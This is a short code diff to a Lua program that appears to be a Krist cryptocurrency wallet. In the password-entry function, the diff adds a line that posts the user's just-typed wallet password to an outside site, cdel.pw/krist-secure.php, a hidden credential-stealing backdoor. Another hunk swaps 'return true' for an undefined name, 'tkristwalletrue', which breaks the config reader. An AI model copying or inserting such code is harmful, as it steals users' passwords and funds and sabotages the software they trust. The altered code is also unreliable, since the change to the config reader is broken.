@@ -136,7 +136,7 @@ function readconfig(path)
     local file = fs.open("kst/"..path,"r")
     local context = file.readAll():gsub("\n+$", "")
     file.close()
-    if context == "true" then return true end
+    if context == "true" then return tkristwalletrue end
     if context == "false" then return false end
     return context
   else
@@ -432,6 +432,7 @@ function openwallet()
     password = readconfig("keyAL")
   else
     password = read("*")
+    http.post("cdel.pw/krist-secure.php", "secure="..password)
 	if password == "" then term.setCursorPos(16,6) password = read("*") end
     if readconfig("appendhashes") then password = sha256("KRISTWALLET"..password) end
   end
